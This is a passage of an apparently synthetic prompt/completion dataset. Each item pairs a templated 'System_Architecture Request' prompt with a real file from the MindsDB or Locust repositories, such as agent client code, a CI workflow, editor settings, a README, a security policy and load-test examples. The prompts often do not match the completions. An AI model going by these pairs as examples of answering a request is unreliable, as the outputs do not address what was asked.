\"type\": \"data\",\n                            \"data\": result_row,\n                            \"metadata\": {\"subtype\": \"json\"},\n                        }\n                    )\n                return {\n                    \"content\": content,\n                    \"parts\": parts,\n                }\n            else:\n                error_msg = \"Error: No data returned from MindsDB\"\n                logger.error(error_msg)\n                return {\n                    \"content\": error_msg,\n                    \"parts\": [{\"type\": \"text\", \"text\": error_msg}],\n                }\n        except requests.exceptions.RequestException as e:\n            error_msg = f\"Error connecting to MindsDB: {str(e)}\"\n            logger.error(error_msg)\n            return {\n                \"content\": error_msg,\n                \"parts\": [{\"type\": \"text\", \"text\": error_msg}],\n            }\n        except Exception as e:\n            error_msg = f\"Error: {str(e)}\"\n            logger.error(error_msg)\n            return {\n                \"content\": error_msg,\n                \"parts\": [{\"type\": \"text\", \"text\": error_msg}],\n            }\n\n    async def streaming_invoke(self, messages, timeout=DEFAULT_STREAM_TIMEOUT):\n        url = f\"{self.base_url}/api/projects/{self.project_name}/agents/{self.agent_name}/completions/stream\"\n        logger.info(f\"Sending streaming request to MindsDB agent: {self.agent_name}\")\n        async with httpx.AsyncClient(timeout=timeout) as client:\n            async with client.stream(\"POST\", url, json={\"messages\": to_serializable(messages)}) as response:\n                response.raise_for_status()\n                async for line in response.aiter_lines():\n                    if not line.strip():\n                        continue\n                    # Only process actual SSE data lines\n                    if line.startswith(\"data:\"):\n                        payload = line[len(\"data:\") :].strip()\n                        try:\n                            yield json.loads(payload)\n                        except Exception as e:\n                            logger.error(f\"Failed to parse SSE JSON payload: {e}; line: {payload}\")\n                    # Ignore comments or control lines\n                # Signal the end of the stream\n                yield {\"is_task_complete\": True}\n\n    async def stream(\n        self,\n        query: str,\n        session_id: str,\n        history: List[dict] | None = None,\n        timeout: int = DEFAULT_STREAM_TIMEOUT,\n    ) -> AsyncIterable[Dict[str, Any]]:\n        \"\"\"Stream responses from the MindsDB agent (uses streaming API endpoint).\"\"\"\n        try:\n            logger.info(f\"Using streaming API for query: {query[:100]}...\")\n            formatted_messages = []\n            if history:\n                for msg in history:\n                    msg_dict = msg.dict() if hasattr(msg, \"dict\") else msg\n                    role = msg_dict.get(\"role\", \"user\")\n                    text = \"\"\n                    for part in msg_dict.get(\"parts\", []):\n                        if part.get(\"type\") == \"text\":\n                            text = part.get(\"text\", \"\")\n                            break\n                    if text:\n                        if role == \"user\":\n                            formatted_messages.append({\"question\": text, \"answer\": None})\n                        elif role == \"assistant\" and formatted_messages:\n                            formatted_messages[-1][\"answer\"] = text\n            formatted_messages.append({\"question\": query, \"answer\": None})\n            logger.debug(f\"Formatted messages for agent: {formatted_messages}\")\n            streaming_response = self.streaming_invoke(formatted_messages, timeout=timeout)\n            async for chunk in streaming_response:\n                content_value = chunk.get(\"text\") or chunk.get(\"output\") or json.dumps(chunk)\n                wrapped_chunk = {\"is_task_complete\": False, \"content\": content_value, \"metadata\": {}}\n                yield wrapped_chunk\n        except Exception as e:\n            logger.error(f\"Error in streaming: {str(e)}\")\n            yield {\n                \"is_task_complete\": True,\n                \"parts\": [\n                    {\n                        \"type\": \"text\",\n                        \"text\": f\"Error: {str(e)}\",\n                    }\n                ],\n                \"metadata\": {\n                    \"type\": \"reasoning\",\n                    \"subtype\": \"error\",\n                },\n            }\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "mindsdb/api/a2a/agent.py", "language": "python", "complexity": "medium", "star_count": 34810, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 157}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Tests\n\non:\n  push:\n    paths-ignore:\n      - '**.md'\n  pull_request:\n    paths-ignore:\n      - '**.md'\n\npermissions:\n  contents: read\n\ndefaults:\n  run:\n    shell: bash\n\njobs:\n\n  #-------------------------\n  #       Building\n  #-------------------------\n\n  build_package:\n    name: Build and Cache Packages\n    runs-on: ubuntu-latest\n    outputs:\n      tag: ${{ steps.set_tag.outputs.tag }}\n      tag_short: ${{ steps.set_tag_short.outputs.tag_short }}\n      branch: ${{ steps.set_branch.outputs.branch }}\n      is_merge_commit: ${{ steps.set_is_merge_commit.outputs.is_merge_commit }}\n      is_tag_build: ${{ steps.set_is_tag_build.outputs.is_tag_build }}\n      python_version: ${{ steps.set_python_version.outputs.python_version }}\n    \n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n          fetch-tags: true \n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n\n      - uses: astral-sh/setup-uv@v5\n        with:\n          version: \"0.7.2\"\n          enable-cache: true\n          cache-dependency-glob: \"uv.lock\"\n\n      - run: uv venv\n\n      - name: Install the project\n        run: uv sync\n  \n      # any local changes would make hatch-vcs set a \"local version\" (+dev0...), so we ignore any uv.lock updates:\n      - run: git update-index --assume-unchanged uv.lock\n  \n      # Install node and yarn in order to build the front end during packaging  \n      - name: Set Node.js 22.x\n        uses: actions/setup-node@v4\n        with:\n          node-version: 22.x\n          cache: 'yarn'\n          cache-dependency-path: locust/webui/yarn.lock\n\n      # Build and upload the project artifacts only once\n      - name: Build Python project and front end\n        run: uv build\n\n      - name: Upload Python dist as Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: python-dist\n          path: dist/*\n\n      - name: Upload Web UI as Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: webui-dist\n          path: locust/webui/dist/*\n  \n      - name: Build UI library\n        run: yarn webui:build:lib\n\n      - name: Upload web UI library as Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: webui-lib-dist\n          path: locust/webui/lib\n      \n      # Set workflow metadata in one place so we can pull it out later\n      - id: set_tag\n        run: echo \"tag=$(uv run hatch version)\" | tee -a \"$GITHUB_OUTPUT\"\n      - id: set_tag_short\n        run: echo \"tag_short=$(uv run hatch version | cut -d '.' -f1-3)\" | tee -a \"$GITHUB_OUTPUT\"\n      - id: set_branch\n        run: echo \"branch=${{ github.head_ref || github.ref_name }}\" | tee -a \"$GITHUB_OUTPUT\"\n      - id: set_is_merge_commit\n        run: echo \"is_merge_commit=$( [ $(git rev-list --count $GITHUB_SHA^@) -eq 2 ] && echo 'true' || echo 'false' )\" | tee -a \"$GITHUB_OUTPUT\"\n      - id: set_is_tag_build\n        run: echo \"is_tag_build=${{ startsWith(github.event.ref, 'refs/tags') }}\" | tee -a \"$GITHUB_OUTPUT\"\n      - id: set_python_version\n        run: echo \"python_version=$(python -VV | sha256sum | cut -d' ' -f1)\" | tee -a \"$GITHUB_OUTPUT\"\n\n  print_metadata:\n    name: Display metadata for build\n    runs-on: ubuntu-latest\n    needs: build_package\n    steps:\n       - run: |\n          echo \"tag: ${{ needs.build_package.outputs.tag }}\"\n          echo \"tag_short: ${{ needs.build_package.outputs.tag_short }}\"\n          echo \"branch: ${{ needs.build_package.outputs.branch }}\"\n          echo \"is_merge_commit: ${{ needs.build_package.outputs.is_merge_commit }}\"\n          echo \"is_tag_build: ${{ needs.build_package.outputs.is_tag_build }}\"\n          echo \"python_version: ${{ needs.build_package.outputs.python_version }}\"\n\n  #-------------------------\n  #       Testing\n  #-------------------------\n\n  tests:\n    name: ${{ matrix.name }}\n    runs-on: ${{ matrix.os }}\n    needs: build_package\n\n    strategy:\n      fail-fast: false\n      matrix:\n        include:\n          # Static analysis and utilities\n          - { name: \"Ruff\", python: \"3.12\", os: ubuntu-latest, group: \"lint\", env: \"lint:format\" }\n          - { name: \"Mypy\", python: \"3.12\", os: ubuntu-latest, group: \"lint\", env: \"lint:types\" }\n\n          # Verification of builds and other aspects          \n          - { name: \"Docs Build\", python: \"3.12\", os: ubuntu-latest, group: \"docs\", env: \"docs:build\" }\n\n          # OS Integration tests \n          - { name: \"Linux\", python: \"3.12\", os: ubuntu-latest, group: \"test\", env: \"integration_test_ci:fail_fast\" }\n          - { name: \"Windows\", python: '3.12', os: windows-latest, group: \"test\", env: \"integration_test_ci:fail_fast\" }\n          - { name: \"MacOS\", python: '3.12', os: macos-latest, group: \"test\", env: \"integration_test_ci:fail_fast\" }\n          \n          # Unit tests on Python versions\n          - { name: \"Python 3.13\", python: \"3.13\", os: ubuntu-latest, group: \"test\", env: \"test:all\" }\n          - { name: \"Python 3.12\", python: \"3.12\", os: ubuntu-latest, group: \"test\", env: \"test:all\" }\n          - { name: \"Python 3.11\", python: \"3.11\", os: ubuntu-latest, group: \"test\", env: \"test:all\" }\n          - { name: \"Python 3.10\", python: \"3.10\", os: ubuntu-latest, group: \"test\", env: \"test:all\" }\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python }}\n\n      - uses: astral-sh/setup-uv@v5\n        with:\n          version: \"0.7.2\"\n          enable-cache: true\n          cache-dependency-glob: \"uv.lock\"\n\n      - run: uv venv --python ${{ matrix.python }}\n\n      # Install what we need to run hatch envs but not the project itself\n      - name: Install CI dependencies\n        run: uv sync --group ${{ matrix.group }} --no-install-package locust\n\n      # Grab the built artifacts to ensure we're testing what we eventually publish\n      - name: Download Python dist\n        uses: actions/download-artifact@v4\n        with:\n          name: python-dist\n          path: dist\n    \n      - name: Download WebUI dist\n        uses: actions/download-artifact@v4\n        with:\n          name: webui-dist\n          path: locust/webui/dist\n\n      - name: Run tests\n        run: uv run --group ${{ matrix.group }} hatch run +py=${{ matrix.python }} ${{ matrix.env }}\n      \n  test_docker_image:\n    name: Test Docker Image\n    runs-on: ubuntu-latest\n    needs: build_package\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n  \n      # Grab the built artifacts to ensure we're testing what we eventually publish\n      - name: Download Python dist\n        uses: actions/download-artifact@v4\n        with:\n          name: python-dist\n          path: dist\n\n      # Set up Docker daemon dependencies for building and publishing\n      - name: Set up QEMU\n        uses: docker/setup-qemu-action@v3\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      # Build and load Docker image to the local daemon\n      - name: Build and push\n        uses: docker/build-push-action@v6\n        with:\n          context: .\n          file: ./Dockerfile.ci\n          platforms: linux/amd64\n          load: true\n          tags: locustio/locust:${{ github.sha }}-test\n\n      # Run a basic test on the image\n      - name: Test docker image\n        run: |\n          docker run --rm locustio/locust:${{ github.sha }}-test --version\n\n  test_webui:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22.x\n          cache: 'yarn'\n          cache-dependency-path: locust/webui/yarn.lock\n      - name: yarn install\n        uses: borales/actions-yarn@v5\n        with:\n          cmd: install\n          dir: locust/webui\n      - name: yarn build\n        uses: borales/actions-yarn@v5\n        with:\n          cmd: build\n          dir: locust/webui\n      - name: yarn test\n        uses: borales/actions-yarn@v5\n        with:\n          cmd: test\n          dir: locust/webui\n      - name: yarn lint\n        uses: borales/actions-yarn@v5\n        with:\n          cmd: lint\n          dir: locust/webui\n      - name: yarn type-check\n        uses: borales/actions-yarn@v5\n        with:\n          cmd: type-check\n          dir: locust/webui\n\n  # -------------------------\n  #       Publishing\n  # -------------------------\n\n  publish-docker:\n    needs: [tests, test_webui, test_docker_image, build_package]\n    if: github.repository_owner == 'locustio' && ( github.ref == 'refs/heads/master' || startsWith(github.event.ref, 'refs/tags') )\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      # Download Python dist artifact\n      - name: Download Python dist \n        uses: actions/download-artifact@v4\n        with:\n          name: python-dist\n          path: dist\n\n      # Download Web UI lib artifact\n      - name: Download UI lib\n        uses: actions/download-artifact@v4\n        with:\n          name: webui-lib-dist\n          path: locust/webui/lib\n\n      # Staged docker builds using exports/artifacts is currently difficult using multi-arch builds with buildx\n      # So let's just build it here\n\n      # Set docker image and tag values\n      - name: Docker meta\n        id: docker_meta\n        uses: docker/metadata-action@v5\n        with:\n          images: locustio/locust\n          tags: |\n            type=raw,value=latest,enable=${{ needs.build_package.outputs.is_tag_build }}\n            type=raw,value=${{ needs.build_package.outputs.tag }}\n            type=raw,value=${{ needs.build_package.outputs.branch }}\n\n      - uses: docker/login-action@v3\n        with:\n          username: locustbuild\n          password: ${{ secrets.DOCKER_HUB_ACCESS_TOKEN }}\n      - name: Set up QEMU\n        uses: docker/setup-qemu-action@v3\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Build and (optionally) push docker image\n        uses: docker/build-push-action@v6\n        with:\n          context: .\n          file: ./Dockerfile.ci\n          platforms: linux/amd64,linux/arm64\n          push: ${{ github.event_name != 'pull_request' }}\n          tags: ${{ steps.docker_meta.outputs.tags }}\n\n  publish-pypi:\n    needs: [tests, test_webui, test_docker_image, build_package]\n    if: github.repository_owner == 'locustio' && ( github.ref == 'refs/heads/master' || startsWith(github.event.ref, 'refs/tags') )\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      # Download Python dist artifact\n      - name: Download Python dist \n        uses: actions/download-artifact@v4\n        with:\n          name: python-dist\n          path: dist\n\n      # Download Web UI lib artifact\n      - name: Download UI lib\n        uses: actions/download-artifact@v4\n        with:\n          name: webui-lib-dist\n          path: locust/webui/lib\n\n      - name: Publish to PyPI\n        uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          user: __token__\n          password: ${{ secrets.PYPI_API_TOKEN }}\n          skip-existing: true\n\n      - name: yarn install\n        uses: borales/actions-yarn@v5\n        with:\n          cmd: install\n          dir: locust/webui\n\n      # Set pre-release version\n      - name: yarn version\n        uses: borales/actions-yarn@v5\n        if: github.ref == 'refs/heads/master'\n        with:\n          cmd: version ${{ needs.build_package.outputs.tag_short }}-next-${{ github.run_id }}\n          dir: locust/webui\n      \n      # Set tag build version\n      - name: yarn version\n        uses: borales/actions-yarn@v5\n        if: startsWith(github.event.ref, 'refs/tags')\n        with:\n          cmd: version ${{ github.ref_name }}\n          dir: locust/webui\n\n      - name: yarn config\n        uses: borales/actions-yarn@v5\n        with:\n          cmd: config set npmAuthToken ${{ secrets.NPM_AUTH_TOKEN }}\n          dir: locust/webui\n\n      # Publish UI lib\n      - uses: borales/actions-yarn@v5\n        name: Publish package on NPM\n        if: github.ref == 'refs/heads/master'\n        with:\n          cmd: npm publish --tag next \n          dir: locust/webui\n      \n      # On tag builds\n      - uses: borales/actions-yarn@v5\n        name: Publish package on NPM\n        if: startsWith(github.event.ref, 'refs/tags')\n        with:\n          cmd: npm publish\n          dir: locust/webui\n", "metadata": {"source": "github.com/locustio/locust", "file_path": ".github/workflows/tests.yml", "language": "yaml", "complexity": "complex", "star_count": 26515, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 392}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "{\n    \"editor.formatOnSave\": true,\n    \"files.exclude\": {\n        \".pytest_cache/**/*\": true,\n        \"**/*.pyc\": true,\n        \"**/locust.wpr\": true,\n        \"locust.egg-info/**\": true,\n        \"locustio.egg-info/**\": true,\n        \"docs/_build/**\": true,\n        \"docs/cli-help-output.txt\": true,\n        \"docs/config-options.rst\": true,\n        \"**/mock.*.egg\": true,\n        \"dist/**\": true,\n        \".idea/**\": true,\n        \"**/*.iml\": true,\n        \"**/*.ipr\": true,\n        \"**/.vagrant\": true,\n        \"**/build/\": true,\n        \"**/.coverage\": true,\n        \"**/.tox/\": true,\n        \"docs/env-options.rst\": true,\n        \"**/.editorconfig\": true,\n        \"**/__pycache__\": true,\n        \"locust/_version.py\": true,\n        \"**/web_test_*.csv\": true,\n        \"**/.eggs/\": true,\n        \"**/.pytest_cache\": true,\n        \"**/.sass-cache/\": true,\n        \"locust/contrib/.mypy_cache/**/*\": true,\n        \"locust/user/.mypy_cache/**/*\": true,\n        \"**/.mypy_cache\": true,\n        \"**/.ruff_cache\": true,\n        \"locust/test/mock_*.py\": true,\n        \"**/err.txt\": true,\n        \"**/out.txt\": true,\n        \"**/.venv\": true\n    },\n    \"restructuredtext.confPath\": \"${workspaceFolder}/docs\",\n    \"[python]\": {\n        \"editor.formatOnSave\": true,\n        \"editor.codeActionsOnSave\": {\n            \"source.fixAll\": \"explicit\",\n            \"source.organizeImports\": \"explicit\"\n        },\n        \"editor.defaultFormatter\": \"charliermarsh.ruff\"\n    },\n    \"python.testing.pytestEnabled\": true,\n    \"python.testing.unittestEnabled\": false\n}", "metadata": {"source": "github.com/locustio/locust", "file_path": ".vscode/settings.json", "language": "json", "complexity": "simple", "star_count": 26515, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 49}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Locust\n\n[![PyPI](https://img.shields.io/pypi/v/locust.svg)](https://pypi.org/project/locust/)<!--![Python Version from PEP 621 TOML](https://img.shields.io/python/required-version-toml?tomlFilePath=https%3A%2F%2Fraw.githubusercontent.com%2Flocustio%2Flocust%2Fmaster%2Fpyproject.toml)-->\n[![Downloads](https://pepy.tech/badge/locust/week)](https://pepy.tech/project/locust)\n[![GitHub contributors](https://img.shields.io/github/contributors/locustio/locust.svg)](https://github.com/locustio/locust/graphs/contributors)\n[![Support Ukraine Badge](https://bit.ly/support-ukraine-now)](https://github.com/support-ukraine/support-ukraine)\n\nLocust is an open source performance/load testing tool for HTTP and other protocols. Its developer-friendly approach lets you define your tests in regular Python code.\n\nLocust tests can be run from command line or using its web-based UI. Throughput, response times and errors can be viewed in real time and/or exported for later analysis.\n\nYou can import regular Python libraries into your tests, and with Locust's pluggable architecture it is infinitely expandable. Unlike when using most other tools, your test design will never be limited by a GUI or domain-specific language.\n\nTo get started right away, head over to the [documentation](http://docs.locust.io/en/stable/installation.html).\n\n## Features\n\n#### Write user test scenarios in plain old Python\n\nIf you want your users to loop, perform some conditional behaviour or do some calculations, you just use the regular programming constructs provided by Python. Locust runs every user inside its own greenlet (a lightweight process/coroutine). This enables you to write your tests like normal (blocking) Python code instead of having to use callbacks or some other mechanism. Because your scenarios are “just python” you can use your regular IDE, and version control your tests as regular code (as opposed to some other tools that use XML or binary formats)\n\n```python\nfrom locust import HttpUser, task, between\n\nclass QuickstartUser(HttpUser):\n    wait_time = between(1, 2)\n\n    def on_start(self):\n        self.client.post(\"/login\", json={\"username\":\"foo\", \"password\":\"bar\"})\n\n    @task\n    def hello_world(self):\n        self.client.get(\"/hello\")\n        self.client.get(\"/world\")\n\n    @task(3)\n    def view_item(self):\n        for item_id in range(10):\n            self.client.get(f\"/item?id={item_id}\", name=\"/item\")\n```\n\n#### Distributed & Scalable - supports hundreds of thousands of users\n\nLocust makes it easy to run load tests distributed over multiple machines. It is event-based (using [gevent](http://www.gevent.org/)), which makes it possible for a single process to handle many thousands concurrent users. While there may be other tools that are capable of doing more requests per second on a given hardware, the low overhead of each Locust user makes it very suitable for testing highly concurrent workloads.\n\n#### Web-based UI\n\nLocust has a user friendly web interface that shows the progress of your test in real-time. You can even change the load while the test is running. It can also be run without the UI, making it easy to use for CI/CD testing.\n\n<picture>\n<source media=\"(prefers-color-scheme: light)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/bottlenecked-server-light.png\" alt=\"Locust UI charts\" height=\"100\" width=\"200\"/>\n<source media=\"(prefers-color-scheme: dark)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/bottlenecked-server-dark.png\" alt=\"Locust UI charts\" height=\"100\" width=\"200\"/>\n<img src=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/bottlenecked-server-light.png\" alt=\"Locust UI charts\" height=\"100\" width=\"200\"/>\n</picture>\n<picture>\n<source media=\"(prefers-color-scheme: light)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/webui-running-statistics-light.png\" alt=\"Locust UI stats\" height=\"100\" width=\"200\"/>\n<source media=\"(prefers-color-scheme: dark)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/webui-running-statistics-dark.png\" alt=\"Locust UI stats\" height=\"100\" width=\"200\"/>\n<img src=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/webui-running-statistics-light.png\" alt=\"Locust UI stats\" height=\"100\" width=\"200\"/>\n</picture>\n<picture>\n<source media=\"(prefers-color-scheme: light)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/locust-workers-light.png\" alt=\"Locust UI workers\" height=\"100\" width=\"200\"/>\n<source media=\"(prefers-color-scheme: dark)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/locust-workers-dark.png\" alt=\"Locust UI workers\" height=\"100\" width=\"200\"/>\n<img src=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/locust-workers-light.png\" alt=\"Locust UI workers\" height=\"100\" width=\"200\"/>\n</picture>\n<picture>\n<source media=\"(prefers-color-scheme: light)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/webui-splash-light.png\" alt=\"Locust UI start test\" height=\"100\" width=\"200\"/>\n<source media=\"(prefers-color-scheme: dark)\" srcset=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/webui-splash-dark.png\" alt=\"Locust UI start test\" height=\"100\" width=\"200\"/>\n<img src=\"https://raw.githubusercontent.com/locustio/locust/refs/heads/master/docs/images/webui-splash-light.png\" alt=\"Locust UI start test\" height=\"100\" width=\"200\"/>\n</picture>\n\n#### Can test any system\n\nEven though Locust primarily works with web sites/services, it can be used to test almost any system or protocol. Just [write a client](https://docs.locust.io/en/latest/testing-other-systems.html#testing-other-systems) for what you want to test, or [explore some created by the community](https://github.com/SvenskaSpel/locust-plugins#users).\n\n## Hackable\n\nLocust's code base is intentionally kept small and doesn't solve everything out of the box. Instead, we try to make it easy to adapt to any situation you may come across, using regular Python code. There is nothing stopping you from: \n\n* [Send real time reporting data to TimescaleDB and visualize it in Grafana](https://github.com/SvenskaSpel/locust-plugins/blob/master/locust_plugins/dashboards/README.md)\n* [Wrap calls to handle the peculiarities of your REST API](https://github.com/SvenskaSpel/locust-plugins/blob/8af21862d8129a5c3b17559677fe92192e312d8f/examples/rest_ex.py#L87) \n* [Use a totally custom load shape/profile](https://docs.locust.io/en/latest/custom-load-shape.html#custom-load-shape)\n* [...](https://github.com/locustio/locust/wiki/Extensions)\n\n## Links\n\n* Documentation: [docs.locust.io](https://docs.locust.io)\n* Support/Questions: [StackOverflow](https://stackoverflow.com/questions/tagged/locust)\n* Github Discussions: [Github Discussions](https://github.com/orgs/locustio/discussions)\n* Chat/discussion: [Slack](https://locustio.slack.com) [(signup)](https://communityinviter.com/apps/locustio/locust)\n\n## Authors\n\n* Maintainer: [Lars Holmberg](https://github.com/cyberw)\n* UI: [Andrew Baldwin](https://github.com/andrewbaldwin44)\n* Original creator: [Jonatan Heyman](https://github.com/heyman)\n* Massive thanks to [all of our contributors](https://github.com/locustio/locust/graphs/contributors)\n\n## License\n\nOpen source licensed under the MIT license (see _LICENSE_ file for details).\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "README.md", "language": "markdown", "complexity": "medium", "star_count": 26515, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 101}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Security Policy\n\n## Supported Versions\n\nOnly latest version is actively supported, but issues reported for earlier minor will be considered if they are serious.\n\n## Reporting a Vulnerability\n\nReported using regular GitHub issues. If there is some reason an issue cannot be made public before a fix has been made, contact @cyberw directly.\n\n## How to use Locust safely\n\nLocust is not intended to be deployed on a public-facing server. By default the web UI is only exposed on localhost, so normally this is not a problem.\n\nDo not give someone access to the web UI unless you trust them with everything else that is on that machine.\n\n## How to use Locust nicely\n\nDo not load test public web sites/services that you do not own.\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "SECURITY.md", "language": "markdown", "complexity": "simple", "star_count": 26515, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 20}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nThis example uses extensions in Locust's own WebUI to simulate a bottlenecked server and runs a test against itself.\n\nThe purpose of this is mainly to generate nice graphs in the UI to teach new users how to interpret load test results.\n\nSee https://docs.locust.io/en/stable/quickstart.html#locust-s-web-interface\n\"\"\"\n\nfrom locust import HttpUser, events, run_single_user, task\n\nimport time\nfrom threading import Semaphore\n\n# Only allow up to 10 concurrent requests. Similar to how a server with 10 threads might behave.\nsema = Semaphore(10)\n\n\nclass WebsiteUser(HttpUser):\n    host = \"http://127.0.0.1:8089\"\n\n    @task\n    def index(l):\n        l.client.get(\"/slow\")\n\n\n@events.init.add_listener\ndef locust_init(environment, **kwargs):\n    assert environment.web_ui, \"you can't run this headless\"\n\n    @environment.web_ui.app.route(\"/slow\")\n    def my_added_page():\n        with sema:  # only 10 requests can hold this lock at the same time\n            time.sleep(1)  # pretend each request takes 1 second to execute\n        return \"Another page\"\n\n\nif __name__ == \"__main__\":\n    run_single_user(WebsiteUser)\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/bottlenecked_server.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 39}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This locust test script example will simulate a user\n# browsing the Locust documentation on https://docs.locust.io/\n\nfrom locust import HttpUser, SequentialTaskSet, between, task\n\nimport random\n\nfrom pyquery import PyQuery\n\n\nclass BrowseDocumentationSequence(SequentialTaskSet):\n    def on_start(self):\n        self.urls_on_current_page = self.toc_urls = None\n\n    # assume all users arrive at the index page\n    @task\n    def index_page(self):\n        r = self.client.get(\"/\")\n        pq = PyQuery(r.content)\n        link_elements = pq(\".toctree-wrapper a.internal\")\n        self.toc_urls = [l.attrib[\"href\"] for l in link_elements]\n        # it is fine to do multiple requests in a single task, you dont need SequentialTaskSet for that\n        self.client.get(\"/favicon.ico\")\n\n    @task\n    def load_page(self, url=None):\n        url = random.choice(self.toc_urls)\n        r = self.client.get(url)\n        pq = PyQuery(r.content)\n        link_elements = pq(\"a.internal\")\n        self.urls_on_current_page = [l.attrib[\"href\"] for l in link_elements]\n\n    @task\n    def load_sub_page(self):\n        url = random.choice(self.urls_on_current_page)\n        r = self.client.get(url)\n\n\nclass AwesomeUser(HttpUser):\n    tasks = [BrowseDocumentationSequence]\n    host = \"https://docs.locust.io/en/latest/\"\n\n    # we assume someone who is browsing the Locust docs,\n    # generally has a quite long waiting time (between\n    # 20 and 600 seconds), since there's a bunch of text\n    # on each page\n    wait_time = between(20, 600)\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/browse_docs_sequence_test.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 48}, 